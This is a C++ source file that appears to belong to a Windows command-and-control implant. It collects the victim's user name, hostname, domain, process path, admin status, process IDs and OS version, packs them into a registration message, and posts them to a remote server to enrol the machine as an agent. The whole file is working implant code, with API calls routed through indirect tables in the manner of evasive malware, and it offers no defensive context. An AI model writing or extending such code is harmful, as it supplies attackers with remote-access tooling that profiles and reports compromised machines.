#include "../../includes/core/core.h"
#include "../../includes/utils/utils.h"
#include "../../includes/byte/byte.h"
#include "../../includes/net/net.h"




INT32 GenAgentID() {
	ULONG Seed = hollow->Win32.GetTickCount();
	Seed ^= TO_DWORD(utils::win::GetTeb()->ClientId.UniqueProcess);

	ULONG id = hollow->ntapi.RtlRandomEx(&Seed);
	return (INT32)(id & 0x7FFFFFFF);
}

PBYTE CollectUser(DWORD* out) {
	DWORD BufSize = 0;
	*out = 0;

	hollow->Win32.GetUserNameA(NULL, &BufSize);
	if (!BufSize)
		return NULL;

	PBYTE buf = (PBYTE)hollow->Win32.LocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, BufSize);
	if (!buf)
		return NULL;

	if (!hollow->Win32.GetUserNameA((PCHAR)buf, &BufSize)) {
		hollow->Win32.LocalFree(buf);
		return NULL;
	}

	*out = BufSize ? BufSize - 1 : 0;
	return buf;
}

PBYTE CollectComputerName(COMPUTER_NAME_FORMAT format, DWORD* out) {
	DWORD BufSize = 0;
	*out = 0;

	hollow->Win32.GetComputerNameExA(format, NULL, &BufSize);
	if (!BufSize)
		return NULL;

	PBYTE buf = (PBYTE)hollow->Win32.LocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, BufSize);
	if (!buf)
		return NULL;

	if (!hollow->Win32.GetComputerNameExA(format, (PCHAR)buf, &BufSize)) {
		hollow->Win32.LocalFree(buf);
		return NULL;
	}

	*out = BufSize ? BufSize - 1 : 0;
	return buf;
}

PBYTE CollectHostname(DWORD* out) {
	return CollectComputerName(ComputerNameDnsHostname, out);
}

PBYTE CollectDomain(DWORD* out) {
	return CollectComputerName(ComputerNameDnsDomain, out);
}


PBYTE CollectProcessPath(DWORD* out) {
	*out = 0;

	DWORD Size = 32767;
	PBYTE buf = (PBYTE)hollow->Win32.LocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, Size);
	if (!buf)
		return NULL;

	DWORD Len = hollow->Win32.GetModuleFileNameA(NULL, (PCHAR)buf, Size);
	if (!Len) {
		hollow->Win32.LocalFree(buf);
		return NULL;
	}

	*out = Len;
	return buf;
}


BOOL IsElevated() {
	HANDLE tok = NULL;
	TOKEN_ELEVATION Elev = { 0 };
	BOOL IsElev = FALSE;
	DWORD size = sizeof(TOKEN_ELEVATION);

	NTSTATUS stat = hollow->ntapi.NtOpenProcessToken(OurProcess, TOKEN_QUERY, &tok);
	if (NTAPI_SUCCESS(stat)) {
		NTSTATUS check = hollow->ntapi.NtQueryInformationToken(tok, TokenElevation, &Elev, sizeof(Elev), &size);
		if (NTAPI_SUCCESS(check)) {
			IsElev = (Elev.TokenIsElevated != FALSE);
		}
	}

	if (tok) {
		hollow->Win32.CloseHandle(tok);
	}
	return IsElev;
}


void GetVersionInfo(DWORD* Major, DWORD* Minor, DWORD* Build) {
	*Major = 0;
	*Minor = 0;
	*Build = 0;

	hollow->ntapi.RtlGetNtVersionNumbers(Major, Minor, Build);
	*Build &= 0x0FFFFFFF;
}


ULONG GetPPID() {
	PROCESS_BASIC_INFORMATION pbi = {};
	ULONG retLen = 0;

	NTSTATUS stat = hollow->ntapi.NtQueryInformationProcess(OurProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
	if (!NTAPI_SUCCESS(stat))
		return 0;

	return (ULONG)(ULONG_PTR)pbi.InheritedFromUniqueProcessId;
}


/*
	[int32 cmdType = 1]          // CMD_TYPE_REGISTER
	[int32 AgentId]
	[int32 userNameLen][userName bytes]
	[int32 hostNameLen][hostName bytes]
	[int32 domainLen  ][domain bytes]
	[int32 procPathLen][procPath bytes]
	[int32 IsAdmin]
	[int32 Arch]
	[int32 Pid]
	[int32 Tid]
	[int32 PPid]
	[int32 minor]                // note: minor first
	[int32 major]
	[int32 build]
*/


BOOL RegisterAgent() {
	DWORD Userlen = 0, Hostlen = 0, Domainlen = 0, ProcPathLen = 0;
	DWORD Major = 0, Minor = 0, Build = 0;

	INT32 Agentid = GenAgentID();
	PBYTE User = CollectUser(&Userlen);
	PBYTE Host = CollectHostname(&Hostlen);
	PBYTE Domain = CollectDomain(&Domainlen);
	PBYTE ProcPath = CollectProcessPath(&ProcPathLen);
	BOOL IsElev = IsElevated();
	DWORD Arch = (sizeof(void*) != 4) ? 1 : 0;
	DWORD Pid = TO_DWORD(utils::win::GetTeb()->ClientId.UniqueProcess);
	DWORD Tid = TO_DWORD(utils::win::GetTeb()->ClientId.UniqueThread);
	DWORD PPid = GetPPID();
	BOOL Ok = FALSE;

	GetVersionInfo(&Major, &Minor, &Build);
	DEBUG_LOGA("[*] Collected All Information");

	if (!packager->NewPacker())
		goto CLEANUP;

	if (!packager->Pack4(1)) goto CLEANUP;
	if (!packager->Pack4(Agentid)) goto CLEANUP;

	if (!packager->Pack4((INT32)Userlen)) goto CLEANUP;
	if (Userlen && !packager->PackBytes(User, (INT32)Userlen)) goto CLEANUP;

	if (!packager->Pack4((INT32)Hostlen)) goto CLEANUP;
	if (Hostlen && !packager->PackBytes(Host, (INT32)Hostlen)) goto CLEANUP;

	if (!packager->Pack4((INT32)Domainlen)) goto CLEANUP;
	if (Domainlen && !packager->PackBytes(Domain, (INT32)Domainlen)) goto CLEANUP;

	if (!packager->Pack4((INT32)ProcPathLen)) goto CLEANUP;
	if (ProcPathLen && !packager->PackBytes(ProcPath, (INT32)ProcPathLen)) goto CLEANUP;

	if (!packager->Pack4(IsElev)) goto CLEANUP;
	if (!packager->Pack4((INT32)Arch)) goto CLEANUP;
	if (!packager->Pack4((INT32)Pid)) goto CLEANUP;
	if (!packager->Pack4((INT32)Tid)) goto CLEANUP;
	if (!packager->Pack4((INT32)PPid)) goto CLEANUP;
	if (!packager->Pack4((INT32)Minor)) goto CLEANUP;
	if (!packager->Pack4((INT32)Major)) goto CLEANUP;
	if (!packager->Pack4((INT32)Build)) goto CLEANUP;

	Ok = g_NetMgr->DoPost(packager->PackerPointer(), (SIZE_T)packager->PackerSize());
	hollow->config->AgentID = Agentid;

CLEANUP:
	if (User) { hollow->Win32.LocalFree(User); }
	if (Host) { hollow->Win32.LocalFree(Host); }
	if (Domain) { hollow->Win32.LocalFree(Domain); }
	if (ProcPath) { hollow->Win32.LocalFree(ProcPath); }
	packager->DeletePacker();

	return Ok;
}
